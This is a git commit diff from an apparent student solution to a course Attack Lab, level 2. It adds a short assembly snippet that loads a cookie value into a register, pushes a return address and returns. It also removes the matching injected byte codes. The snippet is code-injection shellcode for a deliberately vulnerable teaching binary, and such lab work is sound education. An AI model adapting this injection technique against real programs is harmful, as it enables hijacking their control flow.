6f77da4a0cda0576f271b41a5b6294dd0bd749e5
Ubuntu <ubuntu@ip-172-31-31-210.us-west-2.compute.internal>
2018-05-07 18:20:20 +0000

    update

---
+++ Labs/AttackLab/target1/Clevel2/level2.s
@@ -0,0 +1,5 @@
+# level2 assembly code to generating Byte Codes
+movq $0x59b997fa, %rdi
+push $0x4017ec
+ret
+
--- Labs/AttackLab/target1/level2.d
+++
@@ -1,3 +0,0 @@
-48 c7 c7 fa 97 b9 59 	/*mov    $0x59b997fa,%rdi   */
-ff 34 25 ec 17 40 00 	/*pushq  0x4017ec           */
-c3                   	/*retq                      */
